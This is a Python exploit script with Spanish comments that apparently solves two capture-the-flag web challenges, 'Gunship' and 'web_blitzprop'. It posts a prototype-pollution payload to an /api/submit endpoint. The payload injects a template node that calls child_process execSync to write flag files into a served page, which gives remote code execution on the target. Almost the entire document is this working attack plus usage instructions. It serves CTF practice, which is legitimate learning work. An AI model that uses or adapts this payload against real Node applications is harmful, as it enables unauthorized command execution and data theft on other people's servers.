import requests 

#Tenemos 2 paginas, las cuales son las que vamos a vulnerar, deberiemos seleccionar una.
print("1) Gunship")
print("2) web_blitzprop")

#Daremos el numero 1 o 2, para seleccionar la pagina que vamos a vulnerar
entrada = int(input("Pagina a Vulnerar: "))
#Seguidamente pondremos los nombres, depende de la pagina te pedira algo, el cual te dara acceso, en este caso 
#haremos lo mismo, le daremos un nombre, depende de la pagina.
nombres = input("Dame el nombres: ")


#Una vez seleccionada la pagina y habiendo dando un nombre, en caso de seleccionar la pagina 1, podremos dar los nombres
#Alex Westaway
#Dan Haigh's
#Alex Westaway and Dan Haigh's, los cuales son los que nos daran el acceso
if(entrada == 1 and (nombres == "Alex Westaway" or nombres == "Dan Haigh's" or nombres == "Alex Westaway and Dan Haigh's")):
      #Una vez ingresados los nombres, procederemos a dar la URL de nuestra pagina, mediante el formato http://ip:puerto
      #Es importante resaltar que debemos quitar la / del final de la URL en caso de haberla copiado desde nuestro navegador
      #Una vez se procede a vulnerar la pagina
      URL = input("Dame una URL con el formato http://ip:puerto sin la / del final: ")
      requests.post(URL + '/api/submit', json = {
            "artist.name":nombres,
            "__proto__.block": {
            "type": "Text",
            "line": "process.mainModule.require('child_process').execSync(`cat flag* > views/index.html`).toString()"
    		}
	})
      #Una vez vulerada la pagina, solo hay que refrescar la pagina y nos dara nuestra flag
      print("Pagina Vulnerada")
      requests.get(URL)

#Este segundo caso es similar al primero, solo que los nobres son diferentes, los cuales tenemos
#Not Polluting with the boys
#ASTa la vista baby
#The Galactic Rhymes
#The Goose went wild
elif(entrada == 2 and (nombres == "Not Polluting with the boys" or nombres == "ASTa la vista baby" or nombres == "The Galactic Rhymes" or nombres == "The Goose went wild")):
      #En este caso, no sera necesario que la URL sea ingresada por el usuario, puesto que la estamos ejecutando en localhost
      #Es importante ver que tenemos el formato http://ip:puerto
      URL2 = "http://localhost:1337"
      requests.post(URL2 + '/api/submit', json = {
            "artist.name":nombres,
            "__proto__.block": {
            "type": "Text",
            "line": "process.mainModule.require('child_process').execSync(`cat flag* > views/index.html`).toString()"
    		}
	})
      #En este caso es un oco diferente, puesto que al vulnerar la pagina, nos vamos a dirigir a nuestra pagina y la refrescaremos, posteriormente 
      #Ingresaremos un nombre de los mencionados con anterioridad, y lo ingresaremos en el campo para que nos deje entrar, posteriormente refrescaremos
      #La pagina y nos dara la bandera
      print("Pagina Vulnerada")
      requests.get(URL2)
      
#Este fichero es ejecutable en terminal con Python3